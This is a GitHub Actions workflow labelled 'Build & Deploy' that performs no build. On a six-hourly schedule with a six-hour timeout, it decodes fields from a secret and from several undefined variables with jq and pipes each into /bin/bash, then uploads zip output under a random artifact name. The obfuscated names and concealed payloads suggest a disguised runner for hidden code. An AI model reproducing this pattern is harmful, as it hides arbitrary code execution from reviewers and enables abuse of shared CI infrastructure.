name: Build & Deploy
on:
  workflow_dispatch:

  schedule:
    - cron: '47 3,9,15,21 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  run:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Build and run
        env:
          u939: ${{ secrets.u939 }}
        run: |
          printf '%s' "$u939" | jq -r .cwhs04121 | /bin/bash
          printf '%s' "$qq1" | jq -r .q3 | /bin/bash
          echo $x4173 | jq -r .ttrm53 | /bin/bash
          echo $n34 | jq -r .m96359 | /bin/bash
          echo $ovhn72 | jq -r .mqre5 | /bin/bash
          printf '%s' "$cs63373" | jq -r .plw0809 | /bin/bash

      - name: Save output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: yI0zxIjT
          path: "*.zip"
          retention-days: 1
